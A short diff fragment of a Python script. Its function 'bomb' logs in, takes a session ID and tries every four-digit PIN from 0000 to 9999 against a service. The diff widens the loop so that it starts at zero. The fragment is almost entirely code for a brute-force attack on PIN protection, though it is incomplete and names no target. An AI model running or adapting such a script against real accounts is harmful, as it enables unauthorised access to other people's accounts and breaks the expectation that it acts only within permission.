@@ -13,7 +13,7 @@ headers = {
 def bomb(username, password):
     dologin(username, password)
     sessionID = getSessionID()
-    for pin in range(859, 10000):
+    for pin in range(0, 10000):
         data = {
             'pin': "%04d"%pin,
             'sessionid' : sessionID
